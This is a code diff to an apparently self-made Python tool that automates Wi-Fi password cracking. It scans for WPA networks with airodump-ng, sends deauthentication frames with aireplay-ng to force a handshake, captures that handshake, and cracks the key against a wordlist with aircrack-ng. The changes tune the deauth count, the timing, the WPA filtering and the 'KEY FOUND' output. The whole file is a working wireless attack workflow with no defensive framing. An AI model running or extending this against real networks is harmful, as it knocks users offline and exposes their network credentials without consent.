@@ -50,6 +50,7 @@ class Interface:
             return False
 
 
+
     def disableMonitorMode(self):
 
         if self.checkMode()=="managed":
@@ -76,14 +77,15 @@ class Capture:
         if "./tmp" not in glob.glob("./*"):
             os.mkdir("./tmp")
 
-    def captureNetwork(self):
+    def captureWPA(self):
         self.setenv()
 
         cmd = f"sudo xterm -e /bin/bash -c -l 'airodump-ng -w tmp/airodump --output-format csv {self.iface}'"
         os.system(cmd)
 
         latest = sorted(glob.glob("tmp/airodump-*.csv"))[-1]
-        networkDF = pd.read_csv(f"{latest}", usecols=['BSSID', ' ESSID', ' channel', ' Privacy']).dropna()
+        networkDF = pd.read_csv(f"{latest}", usecols=['BSSID', ' ESSID', ' channel', ' Privacy'])
+        networkDF = networkDF[networkDF[' Privacy'].str.contains('WPA')]
 
         return networkDF
 
@@ -97,7 +99,7 @@ class Capture:
         return (BSSID, ESSID, CH)
 
     def deauth(self, bssid):
-        cmd = f"sudo xterm -e /bin/bash -c -l 'aireplay-ng --deauth 30 -a {bssid} {self.iface}'"
+        cmd = f"sudo xterm -e /bin/bash -c -l 'aireplay-ng --deauth 10 -a {bssid} {self.iface}'"
         os.system(cmd)
 
     def monHandshake(self, bssid, channel):
@@ -109,7 +111,7 @@ class Capture:
         t2 = Thread(target=self.deauth, args=(bssid,))
 
         t1.start()
-        time.sleep(2)
+        time.sleep(3)
         t2.start()
 
         t2.join()
@@ -153,23 +155,23 @@ def runner(interface, wordlist):
     if monitor_mode:
         print("[+] Monitor Mode Enabled")
         print("Press Ctrl+C when you see the ESSID of the network in the XTERM window\n\n")
-        net_df = capture.captureNetwork()
+        net_df = capture.captureWPA()
         print(net_df)
 
         index = int(input("\nEnter ESSID Index >> "))
         bssid, essid, channel = capture.extractInfo(index=index, networkDF=net_df)
 
-        print("\nPress Ctrl+C when you see WPA[Hanshake Captured-*")
+        print(f"\nPress Ctrl+C when you see [ WPA Hanshake: {bssid}")
         capture.grabCAP(bssid=bssid, channel=channel)
 
         cracker = Cracker(wordlist=wordlist, BSSID=bssid)
         print("[+] Cracking Password")
         password = cracker.aircrack()
         if password:
-            print(f"\n[+] KEY FOUND : {password}\n\n")
+            print(f"\n\n[ ***KEY FOUND FOR {essid}: {password} ]\n\n".center(os.get_terminal_size().columns))
 
         else:
-            print("\n[-] Sorry, Unable to find the key!\n\n")
+            print("[-] Sorry, Unable to find the key!")
 
         managed_mode = ifacectrl.disableMonitorMode()
         if managed_mode:
